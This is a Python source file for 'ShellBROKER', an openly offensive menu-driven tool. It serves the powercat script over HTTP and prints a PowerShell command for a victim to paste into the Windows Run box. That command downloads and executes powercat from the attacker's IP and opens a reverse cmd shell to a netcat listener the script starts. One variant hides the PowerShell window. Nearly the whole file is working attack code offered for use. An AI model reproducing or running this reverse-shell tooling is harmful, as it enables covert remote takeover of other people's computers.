from pyfiglet import Figlet
import os
from subprocess import call
import socket
import netifaces as ni


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear():
    clear = "\n" * 100
    print(clear)

clear()

title = Figlet(font='big')

print(title.renderText('ShellBROKER'))
print(" ")
print("By Szymon3eK")
print("Discord: !Szymon3eK#0003")
print(" ")
print("1. Reverse Shell using powercat")
print("")
print("Every letter or number: Quit ShellBROKER")
print(" ")
q = input(">> ")
print(" ")

def one():
    clear()
    print("Write http.server port (80)")
    httpserver = int(input(">> "))
    call(["gnome-terminal", "-e", f"python -m http.server {httpserver}"])
    clear()
    print(bcolors.OKGREEN + "[OK] HTTP.SERVER Running in another terminal..." + bcolors.ENDC)
    print(" ")
    print(" ")
    print(" ")
    print("Write Netcat listener PORT (4444)")
    ncport = int(input(">> "))
    attackquestion(ncport)



def attackquestion(ncport):
    ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
    clear()
    print("Choose attack type!")
    print("")
    print(bcolors.OKCYAN + "1. Normal Powershell")
    print("2. Hidden Powershell")
    print("3. Rasberry PI PICO (comming soon)")
    print("4. Normal batch file (comming soon)" + bcolors.ENDC)
    print("")
    a = input(">> ")

    if a == "1":
        clear()
        print(title.renderText('ShellBROKER'))
        print(" ")

        print("")
        print("Press WIN + R and paste this command")
        print(" ")
        print(bcolors.OKGREEN + f"""powershell -c "IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1') ;powercat -c {ip} -p {ncport} -e cmd   """ + bcolors.ENDC)
        print(" ")
        print("Enjoy!")
        print(" ")
        os.system(f"nc -vlp {ncport}")
    if a == "2":
        clear()
        print(title.renderText('ShellBROKER'))
        print(" ")
        print("Press WIN + R and paste this command")
        print(" ")
        print(bcolors.OKGREEN + f"""powershell -WindowStyle hidden IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1') ;powercat -c {ip} -p {ncport} -e cmd""" + bcolors.ENDC)
        print(" ")
        print("Enjoy!")
        print(" ")
        os.system(f"nc -vlp {ncport}")
    if a == "3":
        print(" ")
        print("Comming soon")
        quit
    if a == "4":
        print(" ")
        print("Comming soon")
        quit
    else:
        print("Quit...")
        quit

    



if q == "1":
    one()
else:
    print("See you soon...")
    quit
